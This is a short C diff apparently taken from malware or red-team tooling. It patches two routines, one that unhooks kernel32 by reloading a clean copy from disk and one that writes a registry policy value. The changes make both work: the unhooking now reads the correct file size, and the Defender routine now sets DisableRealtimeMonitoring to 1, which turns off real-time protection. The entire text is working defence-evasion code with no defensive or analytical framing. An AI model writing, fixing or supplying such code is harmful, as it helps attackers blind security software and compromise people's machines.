@@ -32,7 +32,11 @@ unsigned char jocky_unhook_kernel32() {
     if (hFile == INVALID_HANDLE_VALUE) return 0;
 
     DWORD bytesRead = 0;
-    DWORD moduleSize = mi.SizeOfImage;
+    DWORD moduleSize = GetFileSize(hFile, NULL);
+    if (moduleSize == INVALID_FILE_SIZE || moduleSize == 0) {
+        CloseHandle(hFile);
+        return 0;
+    }
     unsigned char* clean_module = (unsigned char*)malloc(moduleSize);
 
     if (!ReadFile(hFile, clean_module, moduleSize, &bytesRead, NULL)) {
@@ -112,7 +116,7 @@ unsigned char jocky_disable_wdfilter() {
     // Disable Windows Defender real-time monitoring
     HKEY hKey;
     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        DWORD dwValue = 0;
+        DWORD dwValue = 1;
         RegSetValueEx(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(dwValue));
         RegCloseKey(hKey);
         return 1;
